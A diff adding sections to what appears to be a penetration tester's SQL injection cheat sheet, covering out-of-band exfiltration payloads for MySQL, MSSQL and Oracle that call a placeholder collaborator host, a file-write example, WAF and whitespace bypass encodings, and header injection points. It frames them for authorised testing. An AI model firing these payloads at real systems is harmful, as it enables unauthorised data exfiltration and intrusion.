@@ -52,3 +52,38 @@ whitespace alt (%09,%0a), concat via 0x hex, scientific notation for numbers
 ## Tooling
 `sqlmap -r req.txt --batch --level=N --risk=1 --technique=BEUST --dbms=<DBMS>` — use `--risk=1` (no
 destructive), confirm findings MANUALLY, and do not dump real PII.
+
+---
+## 0daysec enrichment (adapted from the user's advanced-sql-injection notes)
+
+### Out-of-band (OOB) exfil by DBMS — attributable blind proof
+Use when there is no in-band reflection and timing is slow/noisy. Fire a unique token to a collaborator.
+```
+# MySQL (Windows only; UNC path triggers SMB/DNS lookup). Precondition: secure_file_priv unset/permissive.
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.TOKEN.oob.example\\x'))-- -
+#   file write (needs FILE priv + writable web dir + secure_file_priv): ... INTO OUTFILE '/var/www/html/x.txt'
+#   check first:  SELECT @@secure_file_priv;    (empty = anywhere, NULL = disabled)
+# MSSQL — DNS/UNC via xp_dirtree (no xp_cmdshell needed); exfil via bcp if command exec is approved.
+'; EXEC master..xp_dirtree '\\TOKEN.oob.example\x'-- -
+# Oracle — UTL_HTTP / UTL_INADDR (DNS) / UTL_TCP
+' AND (SELECT UTL_INADDR.get_host_address('TOKEN.oob.example')) IS NOT NULL-- -
+' AND (SELECT UTL_HTTP.request('http://TOKEN.oob.example/?d='||(SELECT user FROM dual)) FROM dual) IS NOT NULL-- -
+```
+`secure_file_priv` gates MySQL file read/write — always read it before claiming file-based OOB/RCE.
+
+### No-space / WAF bypass (escalate only when a filter blocks the basic form)
+```
+# whitespace alternatives (any of these for a space):
+%09 (tab)  %0a (LF)  %0c (FF)  %0d (CR)  %a0 (non-breaking)  /**/  ()
+#   e.g.  'OR(1)=(1)-- -      'OR/**/1=1-- -      '%0aOR%0a1=1-- -
+# keyword/char obfuscation:
+CONCAT(0x61,0x62)            # hex literals, no quotes
+CHAR(97,98)                  # build strings without quotes
+UNION/**/SELECT   UniON SeLeCt   %55NION (url-encode first byte)
+# double-URL-encode, scientific notation (1e0), comment-splitting /*!50000UNION*/
+```
+
+### Injection surface beyond params — HEADER SQLi
+Test these sinks too (logged/stored → often reach SQL): `User-Agent`, `Referer`, `X-Forwarded-For`,
+`X-Forwarded-Host`, `Cookie` values, and any custom header the app persists. Same payloads; confirm
+the same way (error/boolean/time/OOB).
